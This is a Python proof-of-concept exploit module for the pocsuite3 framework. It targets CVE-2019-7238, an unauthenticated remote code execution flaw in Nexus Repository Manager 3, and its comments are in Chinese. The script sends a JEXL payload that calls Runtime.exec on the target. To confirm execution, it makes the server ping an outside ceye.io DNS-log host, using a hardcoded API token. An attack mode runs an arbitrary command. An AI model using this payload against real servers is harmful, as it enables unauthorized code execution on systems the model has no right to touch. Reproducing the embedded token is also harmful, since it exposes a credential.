#!/usr/bin/env python
#coding=utf-8

import random
import json
from string import ascii_letters
import time
import traceback

from pocsuite3.api import requests as req
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
from pocsuite3.api import POC_CATEGORY, VUL_TYPE
 

'''
CVE-2019-7238
这个漏洞需要有Nexus有assets才能触发
'''
class Nexus3_2019_7238_POC(POCBase):
    vulID = 'Nexus3-CVE-2019-7238'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    vulDate = '2019-02-05'  # 漏洞公开的时间,不知道就写今天
    author = 'shadowsock5'  # PoC作者的大名
    createDate = '2019-02-20'  # 编写 PoC 的日期
    updateDate = '2020-04-09'  # PoC 更新的时间,默认和编写时间一样
    references = ['https://mp.weixin.qq.com/s/P1KC7wadbEZbHvavYQjbVA']  # 漏洞地址来源,0day不用写
    name = 'Nexus3 未授权RCE'  # PoC 名称
    appPowerLink = ['https://support.sonatype.com/hc/en-us/articles/360017310793-CVE-2019-7238-Nexus-Repository-Manager-3-Missing-Access-Controls-and-Remote-Code-Execution-February-5th-2019']  # 漏洞厂商主页地址
    appName = 'Nexus Repository Manager 3'  # 漏洞应用名称
    appVersion = 'Nexus 3 < 3.15.0'  # 漏洞影响版本
    category = POC_CATEGORY.EXPLOITS.REMOTE
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''
        Nexus Repository Manager 3 未授权 RCE
    '''  # 漏洞简要描述
    cvss = u"高危"  # 严重,高危,中危,低危

    
    # 使用随机字符串作为banner，通过ceye的接口判断命令是否被执行
    DOMAIN = 'wvg689.ceye.io'
    TOKEN = '76dce59a986eab595838f7dc74903035'
    BANNER = ''.join([random.choice(ascii_letters) for i in range(6)])
    CEYE_URL = 'http://api.ceye.io/v1/records?token={0}&type=dns&filter={1}'.format(TOKEN, BANNER)

    
    def _verify(self, cmd='ping {0}.{1}'.format(BANNER, DOMAIN)):
        
        result={}

        vul_url = self.url
        
        target_url = vul_url + "/service/extdirect"

        headers = {'Referer':''}

        j = {"action":"coreui_Component",
                "method":"previewAssets",
                "data":[{"page":1,"start":0,"limit":25,"filter":
                    [{"property":"repositoryName","value":"*"},
                        {"property":"expression","value":"1.class.forName('java.lang.Runtime').getRuntime().exec('{0}')".format(cmd)},
                        {"property":"type","value":"jexl"}]}],
                "type":"rpc","tid":4}
        
        try:
            resp = req.post(target_url, json=j, headers=headers)#, proxies={'http': 'http://127.0.0.1:8087'})
        except Exception as e:
            print(e)
            raise e
        
        time.sleep(2) # 休眠2s等待dnslog生成记录

        if self.dnslog_sucess(self.CEYE_URL):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = target_url
            result['VerifyInfo']['Payload'] = j
            return self.save_output(result)
        return self.save_output(result)


    # 验证DNS已被解析，命令执行
    def dnslog_sucess(self, url):
        resp = req.get(url)
        d = resp.json()
        try:
            sub_domain = d['data'][0]['domain']
            if self.BANNER in sub_domain:
                print(sub_domain)
                return True
        except Exception:
            return False            


    # 攻击模块
    def _attack(self):
        return self._verify("calc")


    # 输出报告
    def save_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output

# 注册类
register_poc(Nexus3_2019_7238_POC)
